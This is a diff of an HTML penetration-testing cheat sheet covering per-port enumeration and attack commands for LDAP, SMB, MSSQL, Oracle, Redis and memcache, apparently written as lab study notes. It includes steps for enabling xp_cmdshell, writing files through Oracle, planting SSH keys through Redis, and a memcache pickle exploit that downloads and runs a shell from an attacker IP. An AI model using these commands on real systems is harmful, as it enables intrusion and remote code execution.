@@ -1051,31 +1051,35 @@ layout: default
             </tr>
             <tr>
                 <td>Authenticate as user</td>
-                <td>ldapsearch -h &lt;ip address&gt; -x -D '&ls;user&gt;@&lt;domain&gt;' -w '&lt;password&gt;' -b 'DC=something,DC=something'</td>
+                <td>ldapsearch -h &lt;ip address&gt; -x -D &apos;&lt;user&gt;@&lt;domain&gt;&apos; -w &apos;&lt;password&gt;&apos; -b &apos;DC=something,DC=something&apos;</td>
             </tr>
             <tr>
                 <td>Retrieve naming contexts</td>
-                <td>ldapsearch -h &lt;ip address&gt; -x -s base namingcontexts<br>Output can be thought of folders and they are different types of folders</td>
+                <td>
+                    ldapsearch -h &lt;ip address&gt; -x -s base namingcontexts
+                    <ul>
+                        <li>Output can be thought of folders and they are different types of folders</li>
+                    </ul>
+                </td>
             </tr>
             <tr>
                 <td>Output all the LDAP information that can be queried</td>
                 <td>
+                    <li>ldapsearch -h &lt;ip address&gt; -x -b "DC=&lt;value&gt;,DC=&lt;value&gt;"</li>
                     <ul>
-                        <li>ldapsearch -h &lt;ip address&gt; -x -b "DC=&lt;value&gt;,DC=&lt;value&gt;"</li>
+                        <li>DC=values from output of "Retrieving name contexts" command</li>
+                    </ul>
+                    
+                    <li>Terms to grep for on this file (can be done instead of querying ldap for a term directly):</li>
+                    <ul>
+                        <li>member</li>
+                        <li>CN=</li>
+                        <li>memberof</li>
+                        <li>user</li>
+                        <li>Password (and variations such as pwd)</li>
+                        <li>Look for anomalies in output</li>
                         <ul>
-                            <li>DC=values from output of "Retrieving name contexts" command</li>
-                        </ul>
-                        <li>Terms to grep for on this file (can be done instead of querying ldap for a term directly):</li>
-                        <ul>
-                            <li>member</li>
-                            <li>CN=</li>
-                            <li>memberof</li>
-                            <li>user</li>
-                            <li>Password (and variations such as pwd)</li>
-                            <li>Look for anomalies in output</li>
-                            <ul>
-                                <li>cat &lt;ldap output file&gt; | awk '{print $1}' | sort | uniq -c | sort -nr</li>
-                            </ul>
+                            <li>cat &lt;ldap output file&gt; | awk '{print $1}' | sort | uniq -c | sort -nr</li>
                         </ul>
                     </ul>
                 </td>
@@ -1083,21 +1087,19 @@ layout: default
             <tr>
                 <td>Query LDAP</td>
                 <td>
+                    <li>ldapsearch -h &lt;ip address&gt; -x -b "DC=&lt;value&gt;,DC=&lt;value&gt;" '&lt;Query to search&gt;'</li>
                     <ul>
-                        <li>ldapsearch -h &lt;ip address&gt; -x -b "DC=&lt;value&gt;,DC=&lt;value&gt;" '&lt;Query to search&gt;'</li>
+                        <li>Queries to search:</li>
                         <ul>
-                            <li>Queries to search:</li>
+                            <li>objectClass=Person</li>
                             <ul>
-                                <li>objectClass=Person</li>
+                                <li>pwdLastSet</li>
                                 <ul>
-                                    <li>pwdLastSet</li>
-                                    <ul>
-                                        <li>Convert to human readble using online converter:<br>https://www.epochconverter.com/ldap</li>
-                                    </ul>
-                                    <li>sAMAccountName = username</li>
-                                    <ul>
-                                        <li>User is equivalent (not equivalent as a filter)</li>
-                                    </ul>
+                                    <li>Convert to human readble using online converter:<br>https://www.epochconverter.com/ldap</li>
+                                </ul>
+                                <li>sAMAccountName = username</li>
+                                <ul>
+                                    <li>User is equivalent (not equivalent as a filter)</li>
                                 </ul>
                             </ul>
                         </ul>
@@ -1107,27 +1109,27 @@ layout: default
             <tr>
                 <td>Query LDAP with Filters</td>
                 <td>
+                    <li>ldapsearch -h &lt;ip address&gt; -x -b "DC=&lt;value&gt;,DC=&lt;value&gt;" '&lt;Query to search&gt;' &lt;Filter&gt;</li>
                     <ul>
-                        <li>ldapsearch -h &lt;ip address&gt; -x -b "DC=&lt;value&gt;,DC=&lt;value&gt;" '&lt;Query to search&gt;' &lt;Filter&gt;</li>
+                        <li>Can add more than 1 filter</li>
                         <ul>
-                            <li>Can add more than 1 filter</li>
+                            <li>'&lt;Query to search&gt;' &lt;filter 1&gt; &lt;filter 2&gt; &lt;filter 3&gt; ...</li> 
+                        </ul>
+                        
+                        <li>Filter examples</li>
+                        <ul>
+                            <li>sAMAccountName</li>
                             <ul>
-                                <li>'&lt;Query to search&gt;' &lt;filter 1&gt; &lt;filter 2&gt; &lt;filter 3&gt; ...</li> 
+                                <li>Retrieve all usernames.  grep for sAMAccountName to get list of usernames.</li>
+                                <ul>
+                                    <li>Accounts with $ are machine generated.  Passwords not crackable.</li>
+                                    <li>SM_  and HealthMailbox accounts are Exchange related.  Passwords not crackable.</li>
+                                </ul>
                             </ul>
-                            <li>Filter examples</li>
+                            
+                            <li>Domain admins</li>
                             <ul>
-                                <li>sAMAccountName</li>
-                                <ul>
-                                    <li>Retrieve all usernames.  grep for sAMAccountName to get list of usernames.</li>
-                                    <ul>
-                                        <li>Accounts with $ are machine generated.  Passwords not crackable.</li>
-                                        <li>SM_  and HealthMailbox accounts are Exchange related.  Passwords not crackable.</li>
-                                    </ul>
-                                </ul>
-                                <li>Domain admins</li>
-                                <ul>
-                                    <li>"(&(objectClass=user)(memberOf=CN=Domain Admins,CN=Users,DC=htb,DC=local))"</li>
-                                </ul>
+                                <li>"(&(objectClass=user)(memberOf=CN=Domain Admins,CN=Users,DC=htb,DC=local))"</li>
                             </ul>
                         </ul>
                     </ul>
@@ -1175,12 +1177,13 @@ layout: default
                     </tr>
                     <tr>
                         <td>Unmount SMB Share (Forced & Lazy)</td>
-                        <td>sudo umount -f &lt;mounted share directory&gt;</td>
+                        <td>sudo umount -lf &lt;mounted share directory&gt;</td>
                     </tr>
                 </table>
             </td>
         </tr>
     </table>
+    
     <li>crackmapexec</li>
     <table>
         <tr>
@@ -1229,6 +1232,7 @@ layout: default
             <td>-M spider_plus</td>
         </tr>
     </table>
+    
     <li>Query registry information - impacket-reg</li>
     <table>
         <tr>
@@ -1240,6 +1244,7 @@ layout: default
             <td>impacket-reg -hashes &lt;LM:NTLM hashes&gt; &lt;domain&gt;/&lt;username&gt;@&lt;ip address&gt; query -keyName HKLM\\</td>
         </tr>
     </table>
+    
     <li>Interesting registeries</li>
     <ul>
         <li>Some software might store secrets in this directory</li>
@@ -1249,6 +1254,7 @@ layout: default
     <ul>
         <li>Intercept SMB logon requests and gain the hash to crack</li>
     </ul>
+    
     <li>smbpasswd</li>
     <table>
         <tr>
@@ -1256,6 +1262,7 @@ layout: default
             <td>smbpasswd -U &lt;username&gt; -r &lt;domain or ip&gt;</td>
         </tr>
     </table>
+    
     <li>nmap</li>
     <table>
         <td>
@@ -1266,6 +1273,7 @@ layout: default
         </td>
         <td>nmap --script smb-enum-shares</td>
     </table>
+    
     <li>smbmap</li>
     <table>
         <tr>
@@ -1282,6 +1290,7 @@ layout: default
             <td>-R</td>
         </tr>
     </table>
+    
     <li>smbclient</li>
     <table>
         <tr>
@@ -1314,6 +1323,7 @@ layout: default
             <td>get "&lt;Parent File&gt;:&lt;Data Stream File&gt;"</td>
         </tr>
     </table>
+    
     <li>smbcacls</li>
     <table>
         <tr>
@@ -1321,6 +1331,7 @@ layout: default
             <td>smbcacls -N '//&lt;ip address&gt;/&lt;share&gt;' /&lt;folder&gt;</td>
         </tr>
     </table>
+    
     <li>If access to write to SMB share</li>
     <ul>
         <li>SCF File attack</li>
@@ -1329,6 +1340,7 @@ layout: default
             <li>https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/</li>
         </ul>
     </ul>
+    
     <li>Enumerate samba version</li>
     <table>
         <tr>
@@ -1345,6 +1357,7 @@ layout: default
                 <ul>
                     <li>ngrep -i -d tap0 's.?a.?m.?b.?a.*[[:digit:]]' port 139</li>
                 </ul>
+                
                 <li>Terminal 2</li>
                 <ul>
                     <li>echo exit | smbclient -L &lt;ip address&gt;</li>
@@ -1352,6 +1365,7 @@ layout: default
             </td>
         </tr>
     </table>
+    
     <li>Error correction - NT_STATUS_CONNECTION_DISCONNECTED</li>
     <ul>
         <li>Most likely smb is using too new of a protocol and needs to be manually set to use an older one</li>
@@ -1375,11 +1389,13 @@ layout: default
             </tr>
         </table>
     </ul>
+    
     <li> SMB Protocols</li>
     <ul>
         <li>By default SMB2 selects the SMB2_10 variant.</li>
         <li>By default SMB3 selects the SMB3_00 variant.</li>
     </ul>
+    
     <table>
         <tr>
             <td>LANMAN1</td>
@@ -1428,11 +1444,13 @@ layout: default
     <hr>
     
     <h2>464 TCP / kpasswd5</h2>
+    
     <li>Used for changing/setting passwords against Active Directory.</li>
     
     <hr>
     
     <h2>500 UDP / ISAKMP</h2>
+    
     <li>Used for Internet Key Exchange (IKE)</li>
     <li>nmap can only scan open TCP ports through IPSEC VPN using -sT (connect scan?)</li>
     <ul>
@@ -1448,10 +1466,12 @@ layout: default
                         <li>Data source authentication (We will know if the source isn't what is expected for that connection).</li>
                         <li>Protection against replay attacks.</li>
                     </ul>
+                    
                     <li>Encapsulating Security Payloads(ESP)</li>
                     <ul>
                         <li>Provides similar capabilities as AH plus confidentiality (Someone in the middle won't be able to see the data)</li>
                     </ul>
+                    
                     <li>Both of these protocols can operate in two modes:</li>
                     <ul>
                         <li>Transport mode</li>
@@ -1459,6 +1479,7 @@ layout: default
                             <li>The IP of the packet is sent in the clear over the internet for routing, but the payload is encrypted.</li>
                             <li>Typically used directly host to host</li>
                         </ul>
+                        
                         <li>Tunnel mode</li>
                         <ul>
                             <li>The entire IP packet is encrypted and becomes the payload of another IP packet.  The header of the new packet directs where the packet goes.</li>
@@ -1466,10 +1487,12 @@ layout: default
                         </ul>
                     </ul>
                 </ul>
+                
                 <li>There are also security associations (SA) used with IPSEC.  This provides a bundle of algorithms to dynamically exchange keys and establish a secure connection over AH or ESP.  IKE is one of those.</li>
             </ul>
         </ul>
     </ul>
+    
     <li>Tools:</li>
     <ul>
         <li>ike-scan</li>
@@ -1484,6 +1507,7 @@ layout: default
                 </ul>
             </ul>
         </ul>
+        
         <li>strongswan</li>
         <ul>
             <li>Used to connect to VPN once password is known</li>
@@ -1492,6 +1516,7 @@ layout: default
                 <li>sudo apt install libstrongswan-standard-plugins</li>
                 <li>sudo apt install libstrongswan-extra-plugins</li>
             </ul>
+            
             <li>Must edit local files to connect to VPN</li>
             <ul>
                 <li>/etc/ipsec.secrets</li>
@@ -1531,6 +1556,7 @@ layout: default
     <hr>
     
     <h2>636 TCP / LDAPS</h2>
+    
     <li>LDAP SSL connection</li>
     
     <hr>
@@ -1583,6 +1609,7 @@ layout: default
     <hr>
     
     <h2>1433 TCP / Microsoft SQL</h2>
+    
     <li>Good resource: http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet</li>
     <li>Retrieve mssql service's password using smb</li>
     <table>
@@ -1603,7 +1630,9 @@ layout: default
             <td>mssqlclient mssql-svc:'&ls;password&gt;'@&lt;ip&gt; -windows-auth</td>
         </tr>
     </table>
+    
     <li>Run / enable shell commands</li>
+    
     <table>
         <tr>
             <td>Enable xp_cmdshell (with impacket-mssqlclient)</td>
@@ -1622,6 +1651,7 @@ layout: default
             <td>EXEC xp_cmdshell '&lt;command&gt;';</td>
         </tr>
     </table>
+    
     <li>sqsh</li>
     <ul>
         <li>append server to /etc/freetds/freetds.config</li>
@@ -1638,6 +1668,7 @@ layout: default
             </tr>
         </table>
     </ul>
+    
     <li>Mssql commands</li>
     <table>
         <tr>
@@ -1646,7 +1677,9 @@ layout: default
         </tr>
         <tr>
             <td>Enable xp_cmdshell</td>
-            <td>EXEC sp_configure 'show advanced options', 1;<br>RECONFIGURE;<br>EXEC sp_configure 'xp_cmdshell', 1;<br>RECONFIGURE;</td>
+            <td>
+                <pre>&#13;&#10;EXEC sp_configure &apos;show advanced options&apos;, 1;&#13;&#10;RECONFIGURE;&#13;&#10;EXEC sp_configure &apos;xp_cmdshell&apos;, 1;&#13;&#10;RECONFIGURE;&#13;&#10;                </pre>
+            </td>
         </tr>
         <tr>
             <td>View databases</td>
@@ -1658,11 +1691,19 @@ layout: default
         </tr>
         <tr>
             <td>Get table names</td>
-            <td>SELECT * FROM &lt;db name&gt;.INFORMATION_SCHEMA.TABLES;<br>(use &lt;db&gt; first)SELECT name FROM sysobjects WHERE xtype = 'U'</td>
+            <td>
+                SELECT * FROM &lt;db name&gt;.INFORMATION_SCHEMA.TABLES;
+                <br>
+                (use &lt;db&gt; first)SELECT name FROM sysobjects WHERE xtype = 'U'
+            </td>
         </tr>
         <tr>
             <td>List linked servers</td>
-            <td>EXEC sp_linkedservers<br>SELECT * FROM sys.servers;</td>
+            <td>
+                EXEC sp_linkedservers
+                <br>
+                SELECT * FROM sys.servers;
+            </td>
         </tr>
         <tr>
             <td>List users</td>
@@ -1690,15 +1731,16 @@ layout: default
     <ul>
         <li>blackhat.com/presentations/bh-usa-09/GATES/BHUSA09-Gates-OracleMetasploit-SLIDES.pdf</li>
     </ul>
+    
     <li>Metasploit for Oracle</li>
     <ul>
         <li>blog.zsec.uk/msforacle/</li>
     </ul>
+    
     <li>ODAT</li>
     <ul>
         <li>Requires sqlplus to run correctly</li>
-        
-        <li>Methodology</li>
+        <li>Usage</li>
         <table>
             <tr>
                 <td>Enumerate SID for Oracle DB</td>
@@ -1749,32 +1791,40 @@ layout: default
                 </td>
             </tr>
         </table>
-        
-        <li>Oracle DB Commands:</li>
-        <table>
-            <tr>
-                <td>View privileges</td>
-                <td>select * from session_privs;<br>select * from user_role_privs;</td>
-            </tr>
-            <tr>
-                <td>Read file</td>
-                <td>declare<br>f utl_file.file_type;<br>s varchar(400);<br>begin<br>f := utl_file.fopen('/inetpub/wwwroot', 'iisstart.htm', 'R');<br>utl_file.get_line(f,s);<br>utl_file.fclose(f);<br>dbms_output.put_line(s);<br>end;</td>
-            </tr>
-            <tr>
-                <td>Write file</td>
-                <td>declare<br>f utl_file.file_type;<br>s varchar(5000) := '&lt;insert text to write&gt;';<br>begin<br>f := utl_file.fopen('/inetpub/wwwroot', '&lt;file to write&gt;', 'W');<br>utl_file.put_line(f,s);<br>utl_file.fclose(f);<br>end;</td>
-            </tr>
-            <tr>
-                <td>Run last procedure</td>
-                <td>/</td>
-            </tr>
-            <tr>
-                <td>View output</td>
-                <td>set serveroutput ON</td>
-            </tr>
-        </table>
-        
     </ul>
+    
+    <li>Oracle DB Commands:</li>
+    <table>
+        <tr>
+            <td>View privileges</td>
+            <td>
+                select * from session_privs;
+                <br>
+                select * from user_role_privs;
+            </td>
+        </tr>
+        <tr>
+            <td>Read file</td>
+            <td>
+                <pre>&#13;&#10;declare&#13;&#10;f utl_file.file_type;&#13;&#10;s varchar(400);&#13;&#10;begin&#13;&#10;f := utl_file.fopen(&apos;/inetpub/wwwroot&apos;, &apos;iisstart.htm&apos;, &apos;R&apos;);&#13;&#10;utl_file.get_line(f,s);&#13;&#10;utl_file.fclose(f);&#13;&#10;dbms_output.put_line(s);&#13;&#10;end;&#13;&#10;                    </pre>
+            </td>
+        </tr>
+        <tr>
+            <td>Write file</td>
+            <td>
+                <pre>&#13;&#10;                    declare&#13;&#10;                    f utl_file.file_type;&#13;&#10;                    s varchar(5000) := &apos;&lt;insert text to write&gt;&apos;;&#13;&#10;                    begin&#13;&#10;                    f := utl_file.fopen(&apos;/inetpub/wwwroot&apos;, &apos;&lt;file to write&gt;&apos;, &apos;W&apos;);&#13;&#10;                    utl_file.put_line(f,s);&#13;&#10;                    utl_file.fclose(f);&#13;&#10;                    end;&#13;&#10;                    &lt;/file&gt;&#13;&#10;                </pre>
+            </td>
+        </tr>
+        <tr>
+            <td>Run last procedure</td>
+            <td>/</td>
+        </tr>
+        <tr>
+            <td>View output</td>
+            <td>set serveroutput ON</td>
+        </tr>
+    </table>
+    
     <li>Generating shell for Oracle</li>
     <ul>
         <li>1024 character max</li>
@@ -1790,6 +1840,7 @@ layout: default
     <hr>
     
     <h2>2049 TCP / mountd (NFS)</h2>
+    
     <li>sudo apt install nfs-common</li>
     <table>
         <tr>
@@ -1809,6 +1860,7 @@ layout: default
     <hr>
     
     <h2>3000 TCP / Express.js Node</h2>
+    
     <li>hadoop</li>
     <ul>
         <li>Big data storage solution</li>
@@ -1818,6 +1870,7 @@ layout: default
     <hr>
     
     <h2>3268 TCP / LDAP</h2>
+    
     <li>LDAP connection to Global Catalog instead of the local DC which port 389 will return information for</li>
     <li>LDAP requests sent to port 3268 can be used to search for objects in the entire forest.</li>
     <li>Only the attributes marked for replication to the global catalog can be returned.</li>
@@ -1825,6 +1878,7 @@ layout: default
     <hr>
     
     <h2>3269 TCP / LDAPS</h2>
+    
     <li>LDAP connection to Global Catalog over SSL.</li>
     
     <hr>
@@ -1832,7 +1886,6 @@ layout: default
     <h2>3306 TCP / MySql</h2>
     
     <li>Connect to a mysql database</li>
-    
     <ul>
         <li>impacket-mssqlclient username:password@ip.address</li>
         <li>mysql --host=&lt;ip address&gt; --port=&lt;port&gt; --user=&lt;username&gt; -p&lt;password (no space after -p)&gt;</li>
@@ -2000,12 +2053,14 @@ layout: default
             <li>Sometimes no password?</li>
         </ul>
     </ul>
+    
     <li>Typical reverse shell privileges</li>
     <ul>
         <li>NT AUTHORITY/NETWORK SERVICE (low priv)</li>
         <li>Linux - postgres (low priv)</li>
         <li>Mac - user that installed postgres (usually an admin)</li>
     </ul>
+    
     <li>Tools</li>
     <ul>
         <li>psql</li>
@@ -2055,6 +2110,7 @@ layout: default
             </tr>
         </table>
     </ul>
+    
     <li>RCE</li>
     <table>
         <tr>
@@ -2094,12 +2150,14 @@ layout: default
             <li>Only users part of groups that have rights to this are allowed to login this way</li>
         </ul>
     </ul>
+    
     <li>Tools</li>
     <ul>
         <li>Evil-WinRM</li>
         <ul>
             <li>https://github.com/Hackplayers/evil-winrm</li>
         </ul>
+        
         <table>
             <tr>
                 <td>Usage</td>
@@ -2137,6 +2195,7 @@ layout: default
         <li>Create SSH key on victim</li>
         <li>Create malicious cronjob</li>
     </ul>
+    
     <li>Tools</li>
     <ul>
         <li>redis-cli</li>
@@ -2182,7 +2241,9 @@ layout: default
             </tr>
             <tr>
                 <td>Upload SSH Key</td>
-                <td>import public key to redis:<br>(echo -e "\n\n"; cat ./.ssh/id_rsa.pub; echo -e "\n\n") > foo.txt<br>cat foo.txt | redis-cli -h &lt;ip addres&gt; -x set crackit<br>config set dir &lt;writable home directory&gt;<br>config set dbfilename<br>"authorized_keys"<br>save</td>
+                <td>
+                    <pre>&#13;&#10;                    import public key to redis:&#13;&#10;                    (echo -e &quot;\n\n&quot;; cat ./.ssh/id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; foo.txt&#13;&#10;                    cat foo.txt | redis-cli -h &lt;ip addres&gt; -x set crackit&#13;&#10;                    config set dir &lt;writable home directory&gt;&#13;&#10;                    config set dbfilename&#13;&#10;                    &quot;authorized_keys&quot;&#13;&#10;                    save&#13;&#10;                    </pre>
+                </td>
             </tr>
             <tr>
                 <td>Reverse shell through cronjobs</td>
@@ -2200,6 +2261,7 @@ layout: default
     <hr>
     
     <h2>6667 TCP / irc</h2>
+    
     <li>Tools</li>
     <ul>
         <li>hexchat</li>
@@ -2211,6 +2273,7 @@ layout: default
     <hr>
     
     <h2>6697 TCP / irc</h2>
+    
     <li>Incoming IRC connections encrypted via TLS/SSL</li>
     
     <hr>
@@ -2248,6 +2311,7 @@ layout: default
         <li>nc</li>
         <li>telnet</li>
     </ul>
+    
     <li>memcache commands</li>
     <table>
         <tr>
@@ -2286,6 +2350,7 @@ layout: default
             <li>Script:</li>
             <pre>&#13;&#10;import pickle&#13;&#10;import os&#13;&#10;import sys&#13;&#10;from pymemcache.client import base&#13;&#10;class RCE:&#13;&#10;    def __reduce__(self):&#13;&#10;        cmd = (&apos;wget http://{}:5000/shell -O /tmp/shell &amp;&amp; chmod 777 /tmp/shell &amp;&amp; /tmp/shell&apos;.format(sys.argv[1]))&#13;&#10;        return os.system, (cmd,)&#13;&#10;if __name__ == &apos;__main__&apos;:&#13;&#10;    client = base.Client((sys.argv[2], 11211))&#13;&#10;    client.set(sys.argv[3], pickle.dumps(RCE()))                &#13;&#10;            </pre>
         </ul>
+        
         <li>python exploit.py &lt;attacker ip&gt; &lt;memcache server ip&gt; &lt;session:&lt;value&gt;&gt;</li>
         <ul>
             <li>&lt;session:&lt;value&gt;&gt; comes from authenticated session cookie dumped from memcache server</li>
